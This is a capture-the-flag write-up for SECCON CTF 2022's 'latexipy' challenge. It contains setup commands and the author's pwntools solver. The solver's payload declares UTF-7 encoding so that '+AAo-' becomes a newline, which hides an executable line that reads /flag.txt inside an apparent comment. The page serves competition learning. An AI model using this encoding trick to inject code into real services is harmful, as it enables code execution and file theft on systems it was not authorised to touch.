---
title: "Latexipy - SECCON CTF 2022 Quals"
category: "misc"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "latexipy", "misc", "seccon-ctf-2022-quals"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/misc/latexipy"
license: "none stated"
ctf:
  name: "SECCON CTF 2022 Quals"
  year: 2022
  challenge: "Latexipy"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/misc/latexipy>
- **CTF:** SECCON CTF 2022 Quals

---

# [misc] latexipy

## Description

Latexify as a Service

```
nc latexipy.seccon.games 2337
```

## Attachments

- [latexipy](files/latexipy)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_HOST=localhost \
    -e SECCON_PORT=2337 \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `solver.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/misc/latexipy/solver/solver.py>

```python
import os
import pwn

io = pwn.remote(os.getenv("SECCON_HOST"), os.getenv("SECCON_PORT"))

assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
    return x
    #+AAo-print(open("/flag.txt").read())
""".lstrip()

payload += "__EOF__"

io.sendlineafter(b"__EOF__):", payload.encode())

print(io.recvall().decode())
```
